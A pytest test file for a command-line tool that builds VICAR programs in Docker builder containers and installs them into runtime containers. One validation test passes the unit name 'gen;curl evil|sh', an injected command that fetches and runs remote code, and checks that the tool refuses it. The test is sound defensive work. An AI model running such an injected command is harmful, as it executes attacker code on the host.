"""Tests for building VICAR units from source and installing them."""
import json
import subprocess
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest
from click.testing import CliRunner

from tig_cli import build as build_module
from tig_cli.build import (
    DEFAULT_BUILDER_IMAGE,
    Builder,
    Overrides,
    Unit,
    apply_overrides,
    build_image,
    find_unit,
    install,
    object_dir,
    parse_imakefile,
    resolve_builder_image,
    stale_units,
    verify_in_container,
)
from tig_cli.cli import main
from tig_cli.spec import TigError

GEN_IMAKE = """\
#define PROGRAM gen
#define MODULE_LIST gen.c
#define MAIN_LANG_C
#define R2LIB
#define LIB_RTL
"""

MARS_IMAKE = """\
#define PROGRAM marsmesh
#define MODULE_LIST marsmesh.cc
#define MARSLIB
"""


@pytest.fixture(autouse=True)
def isolated_state(tmp_path, monkeypatch):
    """Keep build state out of the invoking user's data directory."""
    monkeypatch.setenv("XDG_DATA_HOME", str(tmp_path / "data"))
    monkeypatch.delenv("TIG_BUILDER_IMAGE", raising=False)
    yield


def write_unit(directory: Path, name: str, content: str, pdf: bool = False) -> Path:
    directory.mkdir(parents=True, exist_ok=True)
    (directory / f"{name}.imake").write_text(content)
    if pdf:
        (directory / f"{name}.pdf").write_text("process help=*\nend-proc\n")
    return directory


def test_parses_program_and_install_library(tmp_path):
    path = tmp_path / "gen.imake"
    path.write_text(GEN_IMAKE)

    assert parse_imakefile(path) == ("gen", "PROGRAM", "p2")


def test_marslib_installs_into_the_mars_subsystem(tmp_path):
    path = tmp_path / "marsmesh.imake"
    path.write_text(MARS_IMAKE)

    assert parse_imakefile(path) == ("marsmesh", "PROGRAM", "mars")


def test_commented_out_macros_are_ignored(tmp_path):
    path = tmp_path / "marsmesh.imake"
    path.write_text(
        "/* #define PROGRAM oldname\n#define R2LIB */\n"
        "#define PROGRAM marsmesh\n#define MARSLIB\n"
    )

    assert parse_imakefile(path) == ("marsmesh", "PROGRAM", "mars")


def test_subroutine_units_are_recognized_as_such(tmp_path):
    path = tmp_path / "marssub.imake"
    path.write_text("#define SUBROUTINE marssub\n#define MARSLIB\n")

    assert parse_imakefile(path)[1] == "SUBROUTINE"


def test_a_file_that_is_not_an_imakefile_is_rejected(tmp_path):
    path = tmp_path / "gen.imake"
    path.write_text("#define MODULE_LIST gen.c\n")

    with pytest.raises(TigError, match="does not look like"):
        parse_imakefile(path)


def test_finds_the_only_unit_in_the_current_directory(tmp_path):
    write_unit(tmp_path, "gen", GEN_IMAKE)

    unit = find_unit(tmp_path)

    assert unit.name == "gen"
    assert unit.directory == tmp_path.resolve()
    assert unit.container_path == "/usr/local/vicar/dev/p2/lib/x86-64-linx/gen"


def test_finds_a_named_unit_from_a_source_root(tmp_path):
    write_unit(tmp_path / "mars/src/prog/marsmesh", "marsmesh", MARS_IMAKE)

    unit = find_unit(tmp_path, "marsmesh")

    assert unit.directory == (tmp_path / "mars/src/prog/marsmesh").resolve()
    assert unit.container_path == "/usr/local/vicar/dev/mars/lib/x86-64-linx/marsmesh"


def test_the_units_own_directory_wins_over_a_copy_below_it(tmp_path):
    write_unit(tmp_path, "gen", GEN_IMAKE)
    write_unit(tmp_path / "backup", "gen", GEN_IMAKE)

    assert find_unit(tmp_path, "gen").directory == tmp_path.resolve()


def test_the_same_unit_in_two_places_below_is_ambiguous(tmp_path):
    write_unit(tmp_path / "a/gen", "gen", GEN_IMAKE)
    write_unit(tmp_path / "b/gen", "gen", GEN_IMAKE)

    with pytest.raises(TigError, match="more than one place"):
        find_unit(tmp_path, "gen")


def test_several_imakefiles_and_no_name_asks_for_one(tmp_path):
    write_unit(tmp_path, "gen", GEN_IMAKE)
    (tmp_path / "marsmesh.imake").write_text(MARS_IMAKE)

    with pytest.raises(TigError, match="name the one to build"):
        find_unit(tmp_path)


def test_no_imakefile_at_all_is_an_error(tmp_path):
    with pytest.raises(TigError, match="No \\*.imake"):
        find_unit(tmp_path)


def test_a_missing_named_unit_is_an_error(tmp_path):
    write_unit(tmp_path, "gen", GEN_IMAKE)

    with pytest.raises(TigError, match="No marsmesh.imake"):
        find_unit(tmp_path, "marsmesh")


def test_library_units_are_refused_with_a_reason(tmp_path):
    (tmp_path / "marssub.imake").write_text(
        "#define SUBROUTINE marssub\n#define MARSLIB\n"
    )

    with pytest.raises(TigError, match="link library"):
        find_unit(tmp_path, "marssub")


def test_a_unit_with_no_install_library_is_refused(tmp_path):
    (tmp_path / "gen.imake").write_text("#define PROGRAM gen\n")

    with pytest.raises(TigError, match="names no install library"):
        find_unit(tmp_path)


def test_a_misnamed_imakefile_is_refused(tmp_path):
    (tmp_path / "other.imake").write_text(GEN_IMAKE)

    with pytest.raises(TigError, match="should be named gen.imake"):
        find_unit(tmp_path)


def test_the_pdf_is_picked_up_only_when_it_exists(tmp_path):
    write_unit(tmp_path, "gen", GEN_IMAKE)
    assert find_unit(tmp_path).pdf is None

    (tmp_path / "gen.pdf").write_text("process\nend-proc\n")
    assert find_unit(tmp_path).pdf == tmp_path / "gen.pdf"


def test_builder_image_comes_from_option_environment_then_config(monkeypatch):
    assert resolve_builder_image(None) == DEFAULT_BUILDER_IMAGE
    assert resolve_builder_image("from-config") == "from-config"
    monkeypatch.setenv("TIG_BUILDER_IMAGE", "from-env")
    assert resolve_builder_image("from-config") == "from-env"
    assert resolve_builder_image("from-config", "from-option") == "from-option"


def test_object_directories_are_private_and_per_source(tmp_path):
    unit = Unit("gen", tmp_path / "one", "PROGRAM", "p2")
    other = Unit("gen", tmp_path / "two", "PROGRAM", "p2")

    assert object_dir(unit, "builder") == object_dir(unit, "builder")
    assert object_dir(unit, "builder") != object_dir(other, "builder")
    assert object_dir(unit, "builder") != object_dir(unit, "other-builder")
    # Nothing is written next to the user's source.
    assert unit.directory not in object_dir(unit, "builder").parents


def test_a_missing_builder_image_says_how_to_build_it():
    with patch.object(build_module, "image_exists", return_value=False):
        with pytest.raises(TigError, match="build-builder-image.sh"):
            Builder("builder", "runtime").check_images()


def test_a_vicar_version_mismatch_is_refused_unless_forced():
    versions = {"builder": "5.0", "runtime": "4.9"}
    with patch.object(build_module, "image_exists", return_value=True), \
            patch.object(build_module, "image_label", side_effect=versions.get):
        with pytest.raises(TigError, match="VICAR version mismatch"):
            Builder("builder", "runtime").check_images()
        Builder("builder", "runtime", force=True).check_images()


def test_images_without_the_version_label_are_accepted():
    with patch.object(build_module, "image_exists", return_value=True), \
            patch.object(build_module, "image_label", return_value=None):
        Builder("builder", "runtime").check_images()


def test_the_build_runs_in_the_builder_with_the_source_read_only(tmp_path):
    write_unit(tmp_path, "gen", GEN_IMAKE)
    unit = find_unit(tmp_path)
    recorded = {}

    def fake_run(command, **kwargs):
        recorded["command"] = command
        work = Path(command[command.index("-w") + 1])
        # Stand in for the compiler, whose output lands in the build directory.
        host_build = [a for a in command if a.endswith(":/build")][0]
        Path(host_build.split(":")[0], unit.name).write_text("binary")
        assert work == Path("/build")
        return subprocess.CompletedProcess(command, 0)

    with patch.object(build_module.subprocess, "run", side_effect=fake_run):
        artifact = Builder("builder:tag", "runtime").build(unit, jobs=4)

    command = recorded["command"]
    assert artifact.read_text() == "binary"
    assert f"{unit.directory}:/src:ro" in command
    assert command[-4:] == ["vicar-build", "gen", "/src", "/build"]
    assert "MAKEFLAGS=-j4" in command
    assert "builder:tag" in command


def test_a_failed_build_points_at_the_build_directory(tmp_path):
    write_unit(tmp_path, "gen", GEN_IMAKE)
    unit = find_unit(tmp_path)

    with patch.object(
        build_module.subprocess,
        "run",
        return_value=subprocess.CompletedProcess([], 2),
    ):
        with pytest.raises(TigError, match="build directory"):
            Builder("builder", "runtime").build(unit)


def test_recorded_builds_survive_for_a_new_container(tmp_path):
    write_unit(tmp_path, "gen", GEN_IMAKE, pdf=True)
    unit = find_unit(tmp_path)
    artifact = tmp_path / "gen"
    artifact.write_text("binary")

    overrides = Overrides("sha256:abcdef1234567890")
    overrides.record(unit, artifact, unit.pdf)

    entry = overrides.load()["gen"]
    assert entry["path"] == unit.container_path
    assert entry["pdf"] is True
    assert (overrides.artifact_dir / "gen").read_text() == "binary"
    assert json.loads(overrides.manifest_path.read_text())["image_id"].startswith(
        "sha256:"
    )


def test_forgetting_a_build_removes_its_artifacts(tmp_path):
    write_unit(tmp_path, "gen", GEN_IMAKE)
    unit = find_unit(tmp_path)
    artifact = tmp_path / "gen"
    artifact.write_text("binary")
    overrides = Overrides("image-id")
    overrides.record(unit, artifact, None)

    assert overrides.forget("gen") == ["gen"]
    assert overrides.load() == {}
    assert not (overrides.artifact_dir / "gen").exists()
    assert overrides.forget("gen") == []


def test_rebuilding_makes_every_container_take_the_new_build(tmp_path):
    write_unit(tmp_path, "gen", GEN_IMAKE)
    unit = find_unit(tmp_path)
    artifact = tmp_path / "gen"
    artifact.write_text("v1")
    overrides = Overrides("image-id")
    overrides.record(unit, artifact, None)
    overrides.mark_applied("container-1")

    artifact.write_text("v2")
    overrides.record(unit, artifact, None)

    assert not overrides.applied("container-1")


def test_cleaning_everything_also_drops_units_of_other_images(tmp_path):
    write_unit(tmp_path, "gen", GEN_IMAKE)
    unit = find_unit(tmp_path)
    artifact = tmp_path / "gen"
    artifact.write_text("binary")
    Overrides("sha256:oldimage0000").record(unit, artifact, None)

    assert build_module.forget_stale("sha256:newimage0000") == ["gen"]
    assert stale_units("sha256:newimage0000") == []


def test_objects_of_a_rebuilt_builder_image_are_not_reused(tmp_path):
    from tig_cli.build import prepare_object_dir

    write_unit(tmp_path, "gen", GEN_IMAKE)
    unit = find_unit(tmp_path)

    work = prepare_object_dir(unit, "builder", "sha256:old")
    (work / "gen.o").write_text("object")
    assert prepare_object_dir(unit, "builder", "sha256:old") == work
    assert (work / "gen.o").is_file()

    # Same tag, different image: its objects were compiled elsewhere.
    assert prepare_object_dir(unit, "builder", "sha256:new") == work
    assert not (work / "gen.o").exists()


def test_the_warm_path_is_skipped_for_a_container_without_the_build(tmp_path):
    from tig_cli.spec import container_carries_builds

    write_unit(tmp_path, "gen", GEN_IMAKE)
    unit = find_unit(tmp_path)
    artifact = tmp_path / "gen"
    artifact.write_text("binary")
    # Nothing built yet: every container is up to date.
    assert container_carries_builds("tig-vicar-1")

    Overrides("image-id").record(unit, artifact, None)
    assert not container_carries_builds("tig-vicar-1")

    with patch.object(build_module, "copy_into_container"), \
            patch.object(build_module, "ensure_wrapper"):
        apply_overrides("tig-vicar-1", "container-1", "image-id")
    assert container_carries_builds("tig-vicar-1")
    assert not container_carries_builds("tig-vicar-2")


def test_a_unit_name_that_is_not_a_program_name_is_refused(tmp_path):
    write_unit(tmp_path, "gen", GEN_IMAKE)

    with pytest.raises(TigError, match="not a valid VICAR unit name"):
        find_unit(tmp_path, "gen;curl evil|sh")


def test_builds_against_another_image_are_reported_as_stale(tmp_path):
    write_unit(tmp_path, "gen", GEN_IMAKE)
    unit = find_unit(tmp_path)
    artifact = tmp_path / "gen"
    artifact.write_text("binary")
    Overrides("sha256:oldimage0000").record(unit, artifact, None)

    assert stale_units("sha256:newimage0000") == ["gen"]
    assert stale_units("sha256:oldimage0000") == []


def test_installing_copies_the_program_the_pdf_and_a_wrapper(tmp_path):
    write_unit(tmp_path, "gen", GEN_IMAKE, pdf=True)
    unit = find_unit(tmp_path)
    artifact = tmp_path / "gen"
    artifact.write_text("binary")
    copies = []

    with patch.object(build_module, "copy_into_container", lambda c, s, d: copies.append(d)), \
            patch.object(build_module, "ensure_wrapper") as wrapper:
        install("tig-vicar-1", unit, artifact, unit.pdf)

    assert copies == [unit.container_path, f"{unit.container_path}.pdf"]
    wrapper.assert_called_once_with(
        "tig-vicar-1", "gen", unit.container_lib_dir, unit.container_path
    )


def test_recorded_builds_are_applied_once_per_container(tmp_path):
    write_unit(tmp_path, "gen", GEN_IMAKE)
    unit = find_unit(tmp_path)
    artifact = tmp_path / "gen"
    artifact.write_text("binary")
    Overrides("image-id").record(unit, artifact, None)
    copies = []

    with patch.object(build_module, "copy_into_container", lambda c, s, d: copies.append(d)), \
            patch.object(build_module, "ensure_wrapper"):
        first = apply_overrides("tig-vicar-1", "container-1", "image-id")
        again = apply_overrides("tig-vicar-1", "container-1", "image-id")
        # A replacement container is a different container, and needs patching.
        replaced = apply_overrides("tig-vicar-1", "container-2", "image-id")

    assert first == ["gen"]
    assert again == []
    assert replaced == ["gen"]
    assert copies == [unit.container_path, unit.container_path]


def test_nothing_is_applied_for_another_image(tmp_path):
    write_unit(tmp_path, "gen", GEN_IMAKE)
    unit = find_unit(tmp_path)
    artifact = tmp_path / "gen"
    artifact.write_text("binary")
    Overrides("image-id").record(unit, artifact, None)

    with patch.object(build_module, "copy_into_container") as copy:
        assert apply_overrides("tig-vicar-1", "container-1", "other-image") == []
    copy.assert_not_called()


def test_verification_reports_a_program_that_cannot_load():
    broken = subprocess.CompletedProcess(
        [], 127, stdout="", stderr="gen: error while loading shared libraries: libx"
    )
    with patch.object(build_module.subprocess, "run", return_value=broken):
        assert "loading shared libraries" in verify_in_container("tig-vicar-1", "gen")


def test_verification_accepts_a_tae_rejection():
    # TAE rejecting '-help' means the program loaded and VICAR started.
    rejected = subprocess.CompletedProcess(
        [], 0, stdout="[TAE-KEYWORD] Ambiguous or unknown keyword 'HELP'.", stderr=""
    )
    with patch.object(build_module.subprocess, "run", return_value=rejected):
        assert verify_in_container("tig-vicar-1", "gen") is None


def test_image_mode_adds_one_layer_over_the_runtime_image(tmp_path):
    write_unit(tmp_path, "gen", GEN_IMAKE, pdf=True)
    unit = find_unit(tmp_path)
    artifact = tmp_path / "gen"
    artifact.write_text("binary")
    seen = {}

    def fake_run(command, **kwargs):
        context = Path(command[-1])
        seen["dockerfile"] = (context / "Dockerfile").read_text()
        seen["files"] = sorted(p.name for p in context.iterdir())
        seen["tag"] = command[command.index("-t") + 1]
        return subprocess.CompletedProcess(command, 0)

    with patch.object(build_module.subprocess, "run", side_effect=fake_run):
        build_image("tig-dev:gen", "runtime:latest", unit, artifact, unit.pdf)

    assert seen["tag"] == "tig-dev:gen"
    assert seen["files"] == ["Dockerfile", "gen", "gen.pdf", "tig-gen-wrapper.sh"]
    assert "FROM runtime:latest" in seen["dockerfile"]
    assert f"COPY gen {unit.container_path}" in seen["dockerfile"]
    assert f"COPY gen.pdf {unit.container_path}.pdf" in seen["dockerfile"]
    # A program the image lacks needs its /usr/local/bin wrapper too.
    assert f"RUN sh /tmp/tig-gen-wrapper.sh 'gen' '{unit.container_lib_dir}'" in (
        seen["dockerfile"]
    )


class TestBuildOptions:
    """The --build flag's argument handling, which shares the tool position."""

    def invoke(self, arguments):
        with patch("tig_cli.cli.ContainerManager") as manager, \
                patch("tig_cli.cli.run_build") as run:
            result = CliRunner().invoke(main, arguments)
        return result, run, manager

    def test_the_positional_argument_names_the_unit(self):
        result, run, _ = self.invoke(["--build", "marsmesh"])

        assert result.exit_code == 0
        assert run.call_args.kwargs["unit_name"] == "marsmesh"

    def test_an_explicit_unit_option_works_without_the_flag(self):
        result, run, _ = self.invoke(["--build-unit", "gen"])

        assert result.exit_code == 0
        assert run.call_args.kwargs["unit_name"] == "gen"

    def test_a_second_positional_argument_is_refused(self):
        result, run, _ = self.invoke(["--build", "marsmesh", "inp=x"])

        assert result.exit_code == 2
        assert "cannot also run" in result.output
        run.assert_not_called()

    def test_it_does_not_combine_with_the_other_lifecycle_flags(self):
        for other in ("--status", "--shutdown", "--shim"):
            result, run, _ = self.invoke(["--build", other])
            assert result.exit_code == 2
            assert "separately" in result.output
            run.assert_not_called()

    def test_listing_and_cleaning_go_to_the_state_helper(self):
        for flag, clean in (("--build-list", False), ("--build-clean", True)):
            with patch("tig_cli.cli.ContainerManager"), \
                    patch("tig_cli.cli.run_build_state") as state:
                result = CliRunner().invoke(main, [flag])
            assert result.exit_code == 0
            assert state.call_args.kwargs["clean"] is clean

    def test_a_build_error_is_reported_without_a_traceback(self):
        with patch("tig_cli.cli.ContainerManager"), \
                patch("tig_cli.cli.run_build", side_effect=TigError("no imakefile")):
            result = CliRunner().invoke(main, ["--build"])

        assert result.exit_code == 1
        assert "no imakefile" in result.output


def test_the_manager_installs_recorded_builds_when_it_adopts_a_container():
    from tig_cli.container import ContainerManager

    manager = MagicMock(spec=ContainerManager)
    manager.container = MagicMock()
    manager.container.id = "container-1"
    manager.container.image.id = "image-1"
    manager.container_name = "tig-vicar-1"

    with patch.object(build_module, "apply_overrides", return_value=["gen"]) as applied:
        ContainerManager._apply_built_programs(manager)

    applied.assert_called_once_with("tig-vicar-1", "container-1", "image-1")
